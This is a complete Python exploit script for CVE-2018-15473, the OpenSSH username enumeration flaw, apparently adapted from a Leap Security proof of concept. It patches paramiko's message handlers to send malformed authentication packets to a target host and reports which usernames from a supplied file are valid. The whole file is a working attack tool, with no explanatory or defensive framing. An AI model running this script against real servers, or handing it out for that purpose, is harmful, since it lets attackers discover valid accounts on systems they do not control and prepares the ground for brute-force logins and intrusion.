#!/usr/bin/python3

# Original script from CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Credits: Matthew Daley, Justin Gardner, Lee David Painter

# Remade into python3 and added user file functionality

import argparse, logging, paramiko, socket, sys, os

class InvalidUsername(Exception):
    pass

# malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# function that'll be overwritten to malform the packet
old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

# malicious function to overwrite MSG_SERVICE_ACCEPT handler
def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)

# call when username was invalid 
def invalid_username(*args, **kwargs):
    raise InvalidUsername()

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username

# perform authentication with malicious packet and username
def check_user(username):
    sock = socket.socket()
    sock.connect((args.target, int(args.port)))
    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except InvalidUsername:
        print("[-] {} is an invalid username".format(username))
        transport.close()
    except paramiko.ssh_exception.AuthenticationException:
        print("[+] {} is a valid username".format(username))

# remove paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('-u', '--username', help="Username to check for validity.")
parser.add_argument('-f', '--file', help="Set a username file")


if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if args.file != None:
	print(f"[*] Testing users in file {args.file}")
	with open(args.file, 'r') as f:
		lines = f.readlines()
		for user in lines:
			print(f"[*] Validating user {user.strip()}")
			check_user(user.strip())

# check_user(args.username)
